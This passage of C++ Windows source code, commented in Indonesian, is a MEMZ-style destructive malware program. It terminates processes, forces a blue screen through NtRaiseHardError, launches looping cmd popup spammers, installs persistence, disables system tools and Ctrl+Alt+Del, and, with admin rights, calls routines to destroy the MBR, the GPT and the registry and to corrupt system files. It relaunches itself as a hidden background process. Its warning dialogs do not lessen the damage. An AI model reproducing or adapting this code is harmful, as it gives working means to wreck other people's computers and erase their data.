            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_TERMINATE, FALSE, processes[i]);
            if (hProcess) {
                HMODULE hMod;
                DWORD cbNeeded;
                
                if (EnumProcessModules(hProcess, &hMod, sizeof(hMod), &cbNeeded)) {
                    GetModuleBaseNameW(hProcess, hMod, szProcessName, sizeof(szProcessName)/sizeof(wchar_t));
                    
                    for (size_t j = 0; j < sizeof(targets)/sizeof(targets[0]); j++) {
                        if (lstrcmpiW(szProcessName, targets[j]) == 0) {
                            TerminateProcess(hProcess, 0);
                            break;
                        }
                    }
                }
                CloseHandle(hProcess);
            }
        }
    }
    
    processKillerActive = true;
}

void TriggerBSOD() {
    HMODULE ntdll = GetModuleHandle(TEXT("ntdll.dll"));
    if (ntdll) {
        typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
        pdef_NtRaiseHardError NtRaiseHardError = 
            reinterpret_cast<pdef_NtRaiseHardError>(GetProcAddress(ntdll, "NtRaiseHardError"));
        
        if (NtRaiseHardError) {
            ULONG Response;
            NTSTATUS status = STATUS_FLOAT_MULTIPLE_FAULTS;
            NtRaiseHardError(status, 0, 0, 0, 6, &Response);
        }
    }
    
    // Fallback: Cause access violation
    int* p = (int*)0x1;
    *p = 0;
}

// ======== FUNGSI POPUP & DESTRUKSI ========
void OpenRandomPopups() {
    const wchar_t* commands[] = {
        L"cmd.exe /k \"@echo off && title CORRUPTED_SYSTEM && color 0a && echo WARNING: SYSTEM INTEGRITY COMPROMISED && for /l %x in (0,0,0) do start /min cmd /k \"echo CRITICAL FAILURE %random% && ping 127.0.0.1 -n 2 > nul && exit\"\"",
        L"powershell.exe -NoExit -Command \"while($true) { Write-Host 'R͏͏҉̧҉U̸N̕͢N̢҉I͠N̶G̵ ͠C̴O̕R͟R̨U̕P̧T͜ED̢ ̸C̵ÒD̸E' -ForegroundColor (Get-Random -InputObject ('Red','Green','Yellow')); Start-Sleep -Milliseconds 200 }\"",
        L"notepad.exe",
        L"explorer.exe",
        L"write.exe",
        L"calc.exe",
        L"mspaint.exe",
        L"regedit.exe",
        L"taskmgr.exe",
        L"control.exe"
    };

    int numPopups = 3 + rand() % 5; // 3-7 popup sekaligus
    bool spawnSpam = (rand() % 3 == 0); // 33% chance spawn cmd spammer

    for (int i = 0; i < numPopups; i++) {
        int cmdIndex = rand() % (sizeof(commands)/sizeof(commands[0]));
        
        // Untuk cmd spam khusus
        if (spawnSpam && i == 0) {
            ShellExecuteW(NULL, L"open", L"cmd.exe", 
                L"/c start cmd.exe /k \"@echo off && title SYSTEM_FAILURE && for /l %x in (0,0,0) do start /min cmd /k echo ͏҉̷̸G҉̢L͠I͏̵T́C̶H͟ ̀͠D͠E͜T̷ÉC̵T̨E̵D͜ %random% && timeout 1 > nul\"", 
                NULL, SW_SHOWMINIMIZED);
            continue;
        }

        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpVerb = L"open";
        sei.lpFile = L"cmd.exe";
        sei.lpParameters = commands[cmdIndex];
        sei.nShow = (rand() % 2) ? SW_SHOWMINIMIZED : SW_SHOWNORMAL;
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        
        ShellExecuteExW(&sei);
        if (sei.hProcess) CloseHandle(sei.hProcess);
        
        Sleep(100); // Delay antar popup
    }

    // Spawn khusus Windows Terminal jika ada
    if (rand() % 5 == 0) {
        ShellExecuteW(NULL, L"open", L"wt.exe", NULL, NULL, SW_SHOW);
    }
}

void ApplyGlitchEffect() {
    if (!pPixels) return;
    
    BYTE* pCopy = new (std::nothrow) BYTE[screenWidth * screenHeight * 4];
    if (!pCopy) return;
    memcpy(pCopy, pPixels, screenWidth * screenHeight * 4);
    
    DWORD currentTime = GetTickCount();
    int timeIntensity = 1 + static_cast<int>((currentTime - startTime) / 5000);
    intensityLevel = std::min(20, timeIntensity);
    
    ApplyScreenShake();
    
    if (currentTime - lastEffectTime > 1000) {
        textCorruptionActive = (rand() % 100 < 30 * intensityLevel);
        lastEffectTime = currentTime;
    }
    
    // Glitch garis horizontal intens
    int effectiveLines = std::min(GLITCH_LINES * intensityLevel, 5000);
    for (int i = 0; i < effectiveLines; ++i) {
        int y = rand() % screenHeight;
        int height = 1 + rand() % (50 * intensityLevel);
        int xOffset = (rand() % (MAX_GLITCH_INTENSITY * 2 * intensityLevel)) - MAX_GLITCH_INTENSITY * intensityLevel;
        
        height = std::min(height, screenHeight - y);
        if (height <= 0) continue;
        
        for (int h = 0; h < height; ++h) {
            int currentY = y + h;
            if (currentY >= screenHeight) break;
            
            BYTE* source = pCopy + (currentY * screenWidth * 4);
            BYTE* dest = pPixels + (currentY * screenWidth * 4);
            
            if (xOffset > 0) {
                int copySize = (screenWidth - xOffset) * 4;
                if (copySize > 0) {
                    memmove(dest + xOffset * 4, 
                            source, 
                            copySize);
                }
                for (int x = 0; x < xOffset; x++) {
                    int pos = (currentY * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = rand() % 256;
                        pPixels[pos + 1] = rand() % 256;
                        pPixels[pos + 2] = rand() % 256;
                    }
                }
            } 
            else if (xOffset < 0) {
                int absOffset = -xOffset;
                int copySize = (screenWidth - absOffset) * 4;
                if (copySize > 0) {
                    memmove(dest, 
                            source + absOffset * 4, 
                            copySize);
                }
                for (int x = screenWidth - absOffset; x < screenWidth; x++) {
                    int pos = (currentY * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = rand() % 256;
                        pPixels[pos + 1] = rand() % 256;
                        pPixels[pos + 2] = rand() % 256;
                    }
                }
            }
        }
    }
    
    // Distorsi blok ekstrim
    int effectiveBlocks = std::min(MAX_GLITCH_BLOCKS * intensityLevel, 1000);
    for (int i = 0; i < effectiveBlocks; ++i) {
        int blockWidth = std::min(50 + rand() % (200 * intensityLevel), screenWidth);
        int blockHeight = std::min(50 + rand() % (200 * intensityLevel), screenHeight);
        int x = rand() % (screenWidth - blockWidth);
        int y = rand() % (screenHeight - blockHeight);
        int offsetX = (rand() % (500 * intensityLevel)) - 250 * intensityLevel;
        int offsetY = (rand() % (500 * intensityLevel)) - 250 * intensityLevel;
        
        for (int h = 0; h < blockHeight; h++) {
            int sourceY = y + h;
            int destY = sourceY + offsetY;
            
            if (destY >= 0 && destY < screenHeight && sourceY >= 0 && sourceY < screenHeight) {
                BYTE* source = pCopy + (sourceY * screenWidth + x) * 4;
                BYTE* dest = pPixels + (destY * screenWidth + x + offsetX) * 4;
                
                int effectiveWidth = blockWidth;
                if (x + offsetX + blockWidth > screenWidth) {
                    effectiveWidth = screenWidth - (x + offsetX);
                }
                if (x + offsetX < 0) {
                    effectiveWidth = blockWidth + (x + offsetX);
                    source -= (x + offsetX) * 4;
                    dest -= (x + offsetX) * 4;
                }
                
                if (effectiveWidth > 0 && dest >= pPixels && 
                    dest + effectiveWidth * 4 <= pPixels + screenWidth * screenHeight * 4) {
                    memcpy(dest, source, effectiveWidth * 4);
                }
            }
        }
    }
    
    if (intensityLevel > 0 && (rand() % std::max(1, 5 / intensityLevel)) == 0) {
        ApplyColorShift(pPixels, (rand() % 3) + 1);
    }
    
    int effectivePixels = std::min(screenWidth * screenHeight * intensityLevel, 100000);
    for (int i = 0; i < effectivePixels; i++) {
        int x = rand() % screenWidth;
        int y = rand() % screenHeight;
        int pos = (y * screenWidth + x) * 4;
        
        if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
            pPixels[pos] = rand() % 256;
            pPixels[pos + 1] = rand() % 256;
            pPixels[pos + 2] = rand() % 256;
        }
    }
    
    if (intensityLevel > 0 && (rand() % std::max(1, 6 / intensityLevel)) == 0) {
        int centerX = rand() % screenWidth;
        int centerY = rand() % screenHeight;
        int radius = std::min(100 + rand() % (500 * intensityLevel), screenWidth/2);
        int distortion = 20 + rand() % (80 * intensityLevel);
        
        int yStart = std::max(centerY - radius, 0);
        int yEnd = std::min(centerY + radius, screenHeight);
        int xStart = std::max(centerX - radius, 0);
        int xEnd = std::min(centerX + radius, screenWidth);
        
        for (int y = yStart; y < yEnd; y++) {
            for (int x = xStart; x < xEnd; x++) {
                float dx = static_cast<float>(x - centerX);
                float dy = static_cast<float>(y - centerY);
                float distance = sqrt(dx*dx + dy*dy);
                
                if (distance < radius) {
                    float amount = pow(1.0f - (distance / radius), 2.0f);
                    int shiftX = static_cast<int>(dx * amount * distortion * (rand() % 3 - 1));
                    int shiftY = static_cast<int>(dy * amount * distortion * (rand() % 3 - 1));
                    
                    int srcX = x - shiftX;
                    int srcY = y - shiftY;
                    
                    if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
                        int srcPos = (srcY * screenWidth + srcX) * 4;
                        int destPos = (y * screenWidth + x) * 4;
                        
                        if (destPos >= 0 && destPos < static_cast<int>(screenWidth * screenHeight * 4) - 4 && 
                            srcPos >= 0 && srcPos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                            pPixels[destPos] = pCopy[srcPos];
                            pPixels[destPos + 1] = pCopy[srcPos + 1];
                            pPixels[destPos + 2] = pCopy[srcPos + 2];
                        }
                    }
                }
            }
        }
    }
    
    if (rand() % 5 == 0) {
        int lineHeight = 1 + rand() % (3 * intensityLevel);
        for (int y = 0; y < screenHeight; y += lineHeight * 2) {
            for (int h = 0; h < lineHeight; h++) {
                if (y + h >= screenHeight) break;
                for (int x = 0; x < screenWidth; x++) {
                    int pos = ((y + h) * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = std::min(pPixels[pos] + 100, 255);
                        pPixels[pos + 1] = std::min(pPixels[pos + 1] + 100, 255);
                        pPixels[pos + 2] = std::min(pPixels[pos + 2] + 100, 255);
                    }
                }
            }
        }
    }
    
    if (intensityLevel > 0 && (rand() % std::max(1, 20 / intensityLevel)) == 0) {
        for (int i = 0; i < static_cast<int>(screenWidth * screenHeight * 4); i += 4) {
            if (i < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                pPixels[i] = 255 - pPixels[i];
                pPixels[i + 1] = 255 - pPixels[i + 1];
                pPixels[i + 2] = 255 - pPixels[i + 2];
            }
        }
    }
    
    if (intensityLevel > 5 && rand() % 10 == 0) {
        ApplyMeltingEffect(pCopy);
    }
    
    if (textCorruptionActive) {
        ApplyTextCorruption();
    }
    
    if (intensityLevel > 3 && rand() % 15 == 0) {
        ApplyPixelSorting();
    }
    
    if (intensityLevel > 2 && rand() % 8 == 0) {
        ApplyStaticBars();
    }
    
    if (intensityLevel > 4 && rand() % 12 == 0) {
        ApplyInversionWaves();
    }
    
    ApplyCursorEffect();
    UpdateParticles();
    
    if (rand() % SOUND_CHANCE == 0) {
        PlayGlitchSoundAsync();
    }
    
    if (rand() % 100 == 0) {
        cursorVisible = !cursorVisible;
        ShowCursor(cursorVisible);
    }
    
    // ===== POPUP RANDOM =====
    static DWORD lastPopupTime = 0;
    if (GetTickCount() - lastPopupTime > 3000 && (rand() % 100 < (20 + intensityLevel * 3))) {
        std::thread(OpenRandomPopups).detach();
        lastPopupTime = GetTickCount();
    }
    
    // ===== DESTRUCTIVE EFFECTS =====
    DWORD cTime = GetTickCount();
    
    // Aktifkan mode kritis setelah 30 detik
    if (!criticalMode && cTime - startTime > 30000) {
        criticalMode = true;
        bsodTriggerTime = cTime + 30000 + rand() % 30000; // BSOD dalam 30-60 detik
        
        if (!persistenceInstalled) {
            InstallPersistence();
            DisableSystemTools();
            DisableCtrlAltDel();
        }
        
        // Aktifkan fitur admin
        if (g_isAdmin) {
            static bool adminDestructionDone = false;
            if (!adminDestructionDone) {
                BreakTaskManager();
                SetCriticalProcess();
                DestroyMBR();
                DestroyGPT();
                DestroyRegistry();
                adminDestructionDone = true;
            }
        }
    }
    
    // Efek khusus mode kritis
    if (criticalMode) {
        static DWORD lastCorruption = 0;
        if (cTime - lastCorruption > 10000) {
            std::thread(CorruptSystemFiles).detach();
            lastCorruption = cTime;
        }
        
        static DWORD lastKill = 0;
        if (cTime - lastKill > 5000) {
            std::thread(KillCriticalProcesses).detach();
            lastKill = cTime;
        }
        
        intensityLevel = 20;
        
        if (cTime >= bsodTriggerTime) {
            std::thread(TriggerBSOD).detach();
        }
    }
    
    delete[] pCopy;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HDC hdcLayered = NULL;
    static BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, AC_SRC_ALPHA };
    
    switch (msg) {
    case WM_CREATE:
        hdcLayered = CreateCompatibleDC(NULL);
        SetTimer(hwnd, 1, REFRESH_RATE, NULL);
        return 0;
        
    case WM_TIMER: {
        CaptureScreen(hwnd);
        ApplyGlitchEffect();
        
        if (hdcLayered && hGlitchBitmap) {
            HDC hdcScreen = GetDC(NULL);
            POINT ptZero = {0, 0};
            SIZE size = {screenWidth, screenHeight};
            
            SelectObject(hdcLayered, hGlitchBitmap);
            UpdateLayeredWindow(hwnd, hdcScreen, &ptZero, &size, hdcLayered, 
                               &ptZero, 0, &blend, ULW_ALPHA);
            
            ReleaseDC(NULL, hdcScreen);
        }
        return 0;
    }
        
    case WM_DESTROY:
        KillTimer(hwnd, 1);
        if (hGlitchBitmap) DeleteObject(hGlitchBitmap);
        if (hdcLayered) DeleteDC(hdcLayered);
        ShowCursor(TRUE);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

// Background process loop
void RunBackgroundProcess() {
    FreeConsole();
    
    // Inisialisasi layar
    HDC hdcScreen = GetDC(NULL);
    screenWidth = GetSystemMetrics(SM_CXSCREEN);
    screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = screenWidth;
    bmi.bmiHeader.biHeight = -screenHeight;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;
    
    hGlitchBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&pPixels, NULL, 0);
    ReleaseDC(NULL, hdcScreen);
    
    // Main loop background
    while (true) {
        if (!persistenceInstalled) {
            InstallPersistence();
            DisableSystemTools();
            DisableCtrlAltDel();
            
            if (g_isAdmin) {
                BreakTaskManager();
                SetCriticalProcess();
            }
        }
        
        CaptureScreen(NULL);
        ApplyGlitchEffect();
        
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        SelectObject(hdcMem, hGlitchBitmap);
        
        POINT ptZero = {0, 0};
        SIZE size = {screenWidth, screenHeight};
        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, AC_SRC_ALPHA };
        
        HWND hDesktop = GetDesktopWindow();
        UpdateLayeredWindow(hDesktop, hdcScreen, &ptZero, &size, hdcMem, 
                           &ptZero, 0, &blend, ULW_ALPHA);
        
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        
        Sleep(REFRESH_RATE);
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    // Deteksi mode admin
    g_isAdmin = IsRunAsAdmin();

    // Tampilkan peringatan pertama
    if (MessageBoxW(NULL, 
        L"WARNING: This program will cause serious system damage!\n\n"
        L"Proceed only if you understand the risks."
        L"This program is NOT TO BE TESTED ON A PRODUCTIVE COMPUTER.\n\n"
        L"Do you really want to continue?",
        L"CRITICAL SECURITY ALERT", 
        MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) != IDYES)
    {
        return 0;
    }
    
    // Tampilkan peringatan kedua
    if (MessageBoxW(NULL, 
        L"FINAL WARNING: This will cause:\n"
        L"- Extreme visual impact\n"
        L"- Continuous system pop-ups\n"
        L"- Possible system damage\n"
        L"- Computer instability\n\n"
        L"Press 'OK' only if you are ready to accept the consequences.",
        L"FINAL CONFIRMATION", 
        MB_OKCANCEL | MB_ICONERROR | MB_DEFBUTTON2) != IDOK)
    {
        return 0;
    }

    // Cek jika sudah berjalan
    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Global\\WinlogonHelperMutex");
    DWORD lastError = GetLastError();
    if (lastError == ERROR_ALREADY_EXISTS) {
        if (hMutex) {
            CloseHandle(hMutex);
        }
        
        if (__argc > 1 && lstrcmpiA(__argv[1], "-background") == 0) {
            return 0;
        }
        
        wchar_t szPath[MAX_PATH];
        GetModuleFileNameW(NULL, szPath, MAX_PATH);
        
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpFile = szPath;
        sei.lpParameters = L"-background";
        sei.nShow = SW_HIDE;
        ShellExecuteExW(&sei);
        return 0;
    }

    srand(static_cast<unsigned>(time(NULL)));
    startTime = GetTickCount();
    
    // Jalankan background process
    if (__argc > 1 && lstrcmpiA(__argv[1], "-background") == 0) {
        RunBackgroundProcess();
        return 0;
    }
    
    // Jalankan instance utama
    FreeConsole();
    
    WNDCLASSEXW wc = {
        sizeof(WNDCLASSEX), 
        CS_HREDRAW | CS_VREDRAW, 
        WndProc,
        0, 0, hInst, NULL, NULL, NULL, NULL,
        L"MEMZ_GLITCH_SIM", NULL
    };
    RegisterClassExW(&wc);
    
    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        wc.lpszClassName, 
        L"CRITICAL SYSTEM FAILURE",
        WS_POPUP, 
        0, 0, 
        GetSystemMetrics(SM_CXSCREEN), 
        GetSystemMetrics(SM_CYSCREEN), 
        NULL, NULL, hInst, NULL
    );
    
    SetWindowPos(
        hwnd, HWND_TOPMOST, 0, 0, 
        GetSystemMetrics(SM_CXSCREEN), 
        GetSystemMetrics(SM_CYSCREEN), 
        SWP_SHOWWINDOW
    );
    
    ShowWindow(hwnd, SW_SHOW);
    
    // Jalankan background process
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpFile = szPath;
    sei.lpParameters = L"-background";
    sei.nShow = SW_HIDE;
    ShellExecuteExW(&sei);
    
    // Mainkan suara startup
    std::thread([]() {
        for (int i = 0; i < 10; i++) {
            Beep(300, 80);
            Beep(600, 80);
            Beep(900, 80);
            Sleep(20);
        }
        
        for (int i = 0; i < 50; i++) {
            Beep(rand() % 5000 + 500, 20);
            Sleep(3);
        }
        
        for (int i = 0; i < 5; i++) {
            Beep(50 + i * 200, 300);
        }
    }).detach();
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    if (hMutex) {
        CloseHandle(hMutex);
    }
    
    return static_cast<int>(msg.wParam);
}
